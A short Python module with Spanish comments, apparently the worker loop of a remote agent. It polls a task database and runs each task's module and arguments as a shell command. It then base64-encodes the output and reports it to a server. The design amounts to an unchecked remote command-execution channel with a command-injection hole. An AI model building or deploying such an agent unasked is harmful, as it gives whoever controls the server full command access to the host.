import subprocess,json,requests,base64
from modules import database,com
from time import sleep
  
def auto(agentid,tiempo,serverurl):
  while True:
    #print('Consultando TASKS en la DB')
    seltask=database.dbSelect('tasks','*','completado','=',0,'prioridad','ASC',1)
    if len(seltask) != 0:
      comando=seltask[0]['modulo']+' '+seltask[0]['argumentos']
      resultado=task(agentid,seltask[0]['id'],comando,serverurl)
    sleep(tiempo)

def task(agentid,taksid,comando,serverurl):
  try:
    status,output=subprocess.getstatusoutput(comando)
    #updateTaskComplete(taksid,output)
    #codificamos por si hay coractéres extraños
    output=base64.b64encode(output.encode('ascii')).decode('ascii')
    database.dbUpdate('tasks',['completado','resultado'],[1,output],'id','=',str(taksid))
    taskCompleteData=[str(taksid),output] 
    com.peticionServer(agentid,'taskComplete',taskCompleteData,serverurl)
    return output
  except:
    print('Error ejecutando o insertando Task')
  
